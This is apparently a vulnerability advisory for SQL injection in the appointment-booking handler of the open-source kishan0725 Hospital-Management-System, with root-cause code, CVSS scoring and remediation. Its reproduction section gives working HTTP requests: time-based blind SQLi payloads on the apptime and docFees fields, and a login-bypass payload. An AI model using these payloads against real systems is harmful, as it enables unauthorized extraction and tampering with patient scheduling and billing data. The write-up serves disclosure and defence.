# Hospital-Management-System Appointment Booking SQL Injection (vanilla PHP + MySQLi)

**CWE-89 · SQL injection (SELECT + INSERT) · blind time-based extraction; INSERT sink requires a patient session (freely obtainable via the login bypass)**

> **Vendor:** kishan0725
> **Product:** Hospital-Management-System (vanilla PHP + MySQLi)
> **Affected version:** master branch, commit 777fda46b77a820977a5ba616283dbfbc40bf7e1 (last commit 2024-10-07; no official release version)
> **Affected endpoints:** POST /admin-panel.php (`app-submit=1`; injectable fields `doctor`, `docFees`, `appdate`, `apptime`)
> **Dedup status:** CLEAN — reviewed against the 12 CVEs already assigned to this project; none covers the booking handler's duplicate-check SELECT or its INSERT sink. (Different file region and root cause from the `?cancel=`/`?ID=` sinks in the same file, which are reported separately.)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The appointment-booking handler in `admin-panel.php` interpolates unfiltered POST values (`doctor`, `docFees`, `appdate`, `apptime`) into two statements: the duplicate-check SELECT (line 42, injectable with no session at all) and the appointment INSERT (line 45, injectable with a patient session — the session itself is obtainable without credentials via the project's separate login SQL injection, so the end-to-end chain stays unauthenticated). Both sinks were verified with time-based oracles and stored-row proof on MySQL 8.0.39.

## 2. Root Cause

| File | Line | Statement |
|---|---|---|
| `admin-panel.php` | 27-33 | unfiltered `$_POST` reads; `fname`/`lname`/`gender`/`contact`/`email` overwritten from `$_SESSION` |
| `admin-panel.php` | 42 | duplicate-check SELECT — sink 1 (unauthenticated) |
| `admin-panel.php` | 45 | appointment INSERT — sink 2 (patient session required) |

```php
// admin-panel.php:27-33 (entry: POST app-submit=1)
// 9 POST fields read unfiltered; then:
$fname   = $_SESSION['firstname'];   // overwrites the POST value
// ... same pattern for lname/gender/contact/email; $pid = $_SESSION['pid']

// L42 (sink 1): duplicate check — $doctor/$appdate/$apptime interpolated raw
$count = mysqli_query($con, "select ... from appointmenttb
          where doctor='$doctor' and appdate='$appdate' and apptime='$apptime' ...");

// L45 (sink 2): INSERT — same values raw, $pid from session
mysqli_query($con, "insert into appointmenttb(pid,fname,...,apptime,userStatus,doctorStatus)
          values($pid,'$fname',...,'$apptime','1','1')");
```

No prepared statements, no escaping, and no authentication gate anywhere in the file.

## 3. Prerequisites

- Sink 1 (duplicate-check SELECT, L42): **none** — fully unauthenticated.
- Sink 2 (INSERT, L45): **an authenticated patient session is required.** Unauthenticated, the empty `$pid` produces `values(,'',...)`, a parse error whose uncaught `mysqli_sql_exception` yields HTTP 500; `SLEEP()` is never evaluated. The required session is obtainable without valid credentials through the patient-login SQL injection in `func.php` (reported separately), so the chain is unauthenticated end-to-end.
- MySQL 8.0.39 behavior: reliable time oracle is the OR-comparison form; quoted-arithmetic constant expressions short-circuit in WHERE (AND form) or raise strict-mode error 1292 in VALUES — numeric-string operands avoid the cast error.

## 4. Reproduction

Sink 1 — unauthenticated time-based blind injection:

```http
POST /admin-panel.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

app-submit=1&doctor=Ganesh&docFees=550&appdate=2027-01-03&apptime=x%27%20OR%20%28SELECT%20858%29%3E%28SELECT%20SLEEP%281%29%29--%20-
# decodes to: apptime = x' OR (SELECT 858)>(SELECT SLEEP(1))-- -
# -> HTTP 200 in 18.257 s (17 appointmenttb rows x SLEEP(1)); baselines ~0.1 s
```

Sink 2 — INSERT injection with patient session (chained):

```http
# step 1: patient session via login SQLi (no valid credentials)
POST /func.php
patsub=1&email=%27+OR+1%3D1+LIMIT+1%23&password2=x      -> 302, PHPSESSID

# step 2: baseline booking (docFees=550)               -> HTTP 200 in 0.123 s, normal row

# step 3: injected booking
POST /admin-panel.php
app-submit=1&fname=x&lname=y&gender=m&email=x@y.z&contact=999&doctor=Ganesh
&docFees=1%27%2B%28SELECT%20SLEEP%282%29%29%2B%271&appdate=2027-04-03&apptime=10%3A00
# decodes to: docFees = 1'+(SELECT SLEEP(2))+'1   ('1'+0+'1' = 2; numeric strings avoid error 1292)
# -> HTTP 200 in 2.117 s
```

Stored-row proof for sink 2:

```sql
SELECT ID,fname,docFees,appdate FROM appointmenttb WHERE appdate='2027-04-03';
-- 19 | <REDACTED> | 2 | 2027-04-03   (docFees stores the evaluated expression result 2;
--                              fname comes from the session (the seeded patient's first name, redacted), not from POST)
```

Runnable PoC: `poc/poc.sh`.

## 5. Confirmed Techniques

- Manual verification on a local instance: MySQL 8.0.39 (127.0.0.1:3307), PHP 8.4.26 built-in server, `display_errors=0`, seeded `myhmsdb.sql`.
- Sink 1 unauthenticated time oracle: 18.257 s vs ~0.1 s (per-row OR evaluation, 17 rows).
- Sink 2 time oracle with session: 2.117 s vs 0.123 s, plus stored `docFees=2` proving in-VALUES expression evaluation.
- Negative results documented: unauthenticated INSERT attempt → HTTP 500 (parse error, SLEEP never evaluated); `'x'+(SELECT SLEEP(n))+'y'` const-expr payloads fail on MySQL 8.0.39 (AND short-circuit in WHERE; strict-mode 1292 in VALUES).

## 6. Impact

- Unauthenticated blind time-based extraction of database content through the duplicate-check SELECT.
- With a patient session (obtainable without credentials via the login bypass): arbitrary row injection into `appointmenttb` and manipulation of stored values such as `docFees` — corrupting scheduling and billing records (integrity), plus planting booking rows for arbitrary patients/doctors.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N` (Base 8.2, High)

## 8. Remediation

- Use prepared statements with bound parameters for both the duplicate-check SELECT and the INSERT.
- Enforce authentication (and ownership of the booking) before any database access in the handler.
- Validate `docFees` against the doctor's stored fee server-side instead of trusting the POST value.

## 9. References

- Project: https://github.com/kishan0725/Hospital-Management-System
- Commit: 777fda46b77a820977a5ba616283dbfbc40bf7e1 (master, 2024-10-07)
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

> 🗑️ External disclosure gist 已下线(2026-09-29): 在先披露密集(issue #71/#64/#49 等),本洞不提交 VulDB。
- VulDB submission #xxxxxx
- Local verification record: `evidence/HMS-07.txt`; PoC: `poc/poc.sh`

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
